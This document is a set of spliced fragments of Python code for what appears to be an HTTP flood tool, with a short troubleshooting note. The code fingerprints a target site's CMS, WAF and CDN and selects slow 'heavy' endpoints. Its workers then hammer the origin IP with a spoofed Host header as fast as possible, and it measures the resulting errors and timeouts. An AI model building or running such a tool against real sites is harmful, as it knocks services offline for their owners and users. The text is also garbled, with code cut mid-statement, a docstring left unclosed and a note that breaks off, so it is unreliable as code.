class UniversalTargetAdapter:
    def __init__(self, domain: str, recon_data: dict):
        self.domain = domain
        self.recon = recon_data
        self.cms = self.detect_cms()
        self.infra = self.detect_infrastructure()
        self.endpoints = self.discover_endpoints()
    
    def detect_cms(self) -> str:
        tech = self.recon.get("technology_stack", {})
        headers = self.recon.get("http_headers_analysis", {}).get("headers", {})
        
        if "wp-content" in str(self.recon) or tech.get("backend_framework") == "WordPress":
            return "wordpress"
        elif "shopify" in str(self.recon).lower() or "myshopify" in self.domain:
            return "shopify"
        elif "squarespace" in str(self.recon).lower() or "squarespace" in headers.get("server", "").lower():
            return "squarespace"
        elif "wix" in str(self.recon).lower():
            return "wix"
        elif "drupal" in str(self.recon).lower():
            return "drupal"
        elif "joomla" in str(self.recon).lower():
            return "joomla"
        elif "magento" in str(self.recon).lower():
            return "magento"
        return "generic"
    
    def detect_infrastructure(self) -> dict:
        waf = self.recon.get("waf_analysis", {})
        cdn = self.recon.get("technology_stack", {}).get("cdn")
        return {
            "waf": waf.get("vendor"),
            "waf_confidence": waf.get("confidence", 0),
            "cdn": cdn,
            "bot_management": waf.get("bot_management", False)
        }
    
    def discover_endpoints(self) -> list[dict]:
        cms_patterns = {
            "wordpress": {
                "heavy": [
                    "/wp-admin/admin-ajax.php",
                    "/wp-json/wp/v2/posts",
                    "/wp-json/wp/v2/search",
                    "/?s=test"
                ],
                "medium": ["/wp-login.php", "/wp-json/wp/v2/users"],
                "light": ["/"],
                "filter_paths": ["/wp-content/", "/wp-includes/", "/wp-admin/*.js", "/wp-admin/*.css"]
            },
            "shopify": {
                "heavy": ["/cart/add.js", "/cart/update.js", "/search?q=test"],
                "medium": ["/products.json", "/collections/all"],
                "light": ["/"],
                "filter_paths": ["/cdn.shopify.com/", "*.js", "*.css"]
            },
            "squarespace": {
                "heavy": ["/api/search", "/api/comments", "/api/commerce/inventory"],
                "medium": ["/"],
                "light": ["/static/*"],
                "filter_paths": ["/assets.squarespace.com/", "/universal/scripts-compressed/"]
            },
            "wix": {
                "heavy": ["/_api/wix-public-html-webapp/site-data", "/_api/communities-blog-node-api/_api/posts"],
                "medium": ["/"],
                "light": ["/_partials/*"],
                "filter_paths": ["/_partials/", "/static/"]
            },
            "generic": {
                "heavy": ["/search", "/api/search", "/graphql", "/login"],
                "medium": ["/api/*", "/rest/*", "/v1/*"],
                "light": ["/"],
                "filter_paths": ["/static/*", "/assets/*", "/cdn/*", "*.js", "*.css", "*.png", "*.jpg"]
            }
        }
        
        patterns = cms_patterns.get(self.cms, cms_patterns["generic"])
        endpoints = []
        
        for path in patterns["heavy"]:
            endpoints.append({
                "url": f"https://{self.domain}{path}",
                "weight": "heavy",
                "cms": self.cms,
                "expected_latency_ms": 3000,
                "method": "POST" if "ajax" in path or "add" in path else "GET"
            })
        
        for path in patterns["medium"]:
            endpoints.append({
                "url": f"https://{self.domain}{path}",
                "weight": "medium",
                "cms": self.cms,
                "expected_latency_ms": 1500,
                "method": "GET"
            })
        
        return endpoints
    
    def filter_invalid(self, endpoints: list[dict]) -> list[dict]:
        """Apply CMS-specific path filters."""
        patterns = {
            "wordpress": ["/wp-content/", "/wp-includes/", "/wp-admin/*.js", "/wp-admin/*.css"],
            "shopify": ["/cdn.shopify.com/", "*.myshopify.com/cdn/*"],
            "squarespace": ["/assets.squarespace.com/", "/universal/scripts-compressed/", "/universal/styles-compressed/"],
            "wix": ["/_partials/", "/static/"],
            "generic": ["/static/", "/assets/", "/cdn/", "*.js", "*.css", "*.png", "*.jpg", "*.gif", "*.svg", "*.woff", "*.ttf"]
        }
        
        filters = patterns.get(self.cms, patterns["generic"])
        filtered = []
        
        for ep in endpoints:
            url = ep["url"]
            path = urlparse(url).path.lower()
            blocked = False
            
            for pattern in filters:
                if pattern.startswith("*"):
                    ext = pattern.lstrip("*.")
                    if path.endswith(f".{ext}"):
                        blocked = True
                        break
                elif pattern.endswith("/*"):
                    prefix = pattern.rstrip("/*")
                    if prefix in path:
                        blocked = True
                        break
                elif pattern in path:
                    blocked = True
                    break
            
            if not blocked:
                filtered.append(ep)
        
        return filtered

                "error": str(e),
                "error_type": type(e).__name__,
                "traceback": traceback.format_exc()
            }

        """
        Benchmark using THE SAME session as attack.
        URL = root path (/), NOT dynamic endpoint.

        url = f"https://{self.ip}/"
        
        # Warm-up: establish connection pool
        try:
            async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status >= 400:
                    return {"rps": 0, "error": f"warmup_failed_http_{resp.status}"}
        except Exception as e:
            return {"rps": 0, "error": f"warmup_failed: {e}"}
        
        # Benchmark: measure actual throughput
        start = time.monotonic()
        count = 0
        errors = 0
        
        while time.monotonic() - start < duration:
            try:
                async with self.session.get(
                    url, 
                    timeout=aiohttp.ClientTimeout(total=5),
                    allow_redirects=True

                    if resp.status < 400:
                        count += 1
                    else:
                        errors += 1
            except asyncio.TimeoutError:
                errors += 1
            except aiohttp.ClientError:
                errors += 1
            except Exception:
                errors += 1
        
        elapsed = time.monotonic() - start
        rps = count / elapsed if elapsed > 0 else 0
        
        return {
            "rps": rps,
            "total_requests": count,
            "errors": errors,
            "duration": elapsed,
            "session_reused": True
        }

class FixedMetrics:
    """
    Error rate = Failed / Attempted.
    Cancelled = intentional, NOT error.
    """
    
    def __init__(self):
        self.attempted = 0
        self.completed = 0
        self.failed = 0
        self.timeout = 0
        self.cancelled = 0
        self.status_codes = Counter()
        self.error_types = Counter()
        self.latencies = []
        self._lock = asyncio.Lock()
    
    async def record_attempt(self):
        async with self._lock:
            self.attempted += 1
    
    async def record_complete(self, status: int, latency_ms: float):
        async with self._lock:
            self.completed += 1
            self.status_codes[status] += 1
            self.latencies.append(latency_ms)
    
    async def record_failed(self, error_type: str):
        async with self._lock:
            self.failed += 1
            self.error_types[error_type] += 1
    
    async def record_timeout(self):
        async with self._lock:
            self.timeout += 1
    
    async def record_cancelled(self):
        async with self._lock:
            self.cancelled += 1
    
    @property
    def error_rate(self) -> float:
        if self.attempted == 0:
            return 0.0
        return self.failed / self.attempted  # CORRECT: only Failed count
    
    @property
    def timeout_rate(self) -> float:
        if self.attempted == 0:
            return 0.0
        return self.timeout / self.attempted
    
    @property
    def success_rate(self) -> float:
        if self.attempted == 0:
            return 0.0
        return self.completed / self.attempted
    
    @property
    def rps(self) -> float:
        if not self.latencies:
            return 0.0
        total_time_sec = sum(self.latencies) / 1000
        return self.completed / total_time_sec if total_time_sec > 0 else 0
    
    @property
    def avg_latency_ms(self) -> float:
        if not self.latencies:
            return 0.0
        return statistics.mean(self.latencies)
    
    def validate(self) -> tuple[bool, str]:
        total = self.completed + self.failed + self.timeout + self.cancelled
        if self.attempted != total:
            return False, f"MISMATCH: Attempted={self.attempted}, Accounted={total}, Missing={self.attempted - total}"
        return True, "BALANCED"
    
    def get_summary(self) -> dict:
        valid, msg = self.validate()
        return {
            "valid": valid,
            "validation_msg": msg,
            "attempted": self.attempted,
            "completed": self.completed,
            "failed": self.failed,
            "timeout": self.timeout,
            "cancelled": self.cancelled,
            "error_rate": round(self.error_rate, 4),
            "timeout_rate": round(self.timeout_rate, 4),
            "success_rate": round(self.success_rate, 4),
            "rps": round(self.rps, 2),
            "avg_latency_ms": round(self.avg_latency_ms, 2),
            "status_distribution": dict(self.status_codes),
            "error_distribution": dict(self.error_types)
        }

async def parallel_worker(
    session: aiohttp.ClientSession,
    url: str,
    metrics: FixedMetrics,
    stop_event: asyncio.Event,
    domain: str
):
    """
    True parallel worker — sends requests as fast as possible
    with connection reuse.
    """
    headers = {"Host": domain}
    
    while not stop_event.is_set():
        await metrics.record_attempt()
        start = time.monotonic()
        
        try:
            async with session.get(
                url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10),
                allow_redirects=True
            ) as resp:
                latency = (time.monotonic() - start) * 1000
                
                if resp.status < 400:
                    await metrics.record_complete(resp.status, latency)
                else:
                    await metrics.record_failed(f"HTTP_{resp.status}")
                    
        except asyncio.TimeoutError:
            await metrics.record_timeout()
        except aiohttp.ClientConnectorError as e:
            await metrics.record_failed(f"ConnectorError:{type(e).__name__}")
        except aiohttp.ClientError as e:
            await metrics.record_failed(f"ClientError:{type(e).__name__}")
        except asyncio.CancelledError:
            await metrics.record_cancelled()
            raise
        except Exception as e:
            await metrics.record_failed(f"UNEXPECTED:{type(e).__name__}")
            traceback.print_exc()

TROUBLESHOOTING
-----------------------------------------------------------

If benchmark still 0 RPS:

  -> Test with curl: curl -v -H "Host: target.com" https://IP/
  -> If curl works but Python fails: asyncio loop issue
  -> Force: asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

If error rate still wrong:
  -> Check FixedMetrics.error_rate property
  -> Must be: self.failed / self.attempted
  -> NOT: (self.attempted - self.completed) / self.attempted

If static assets still appear:
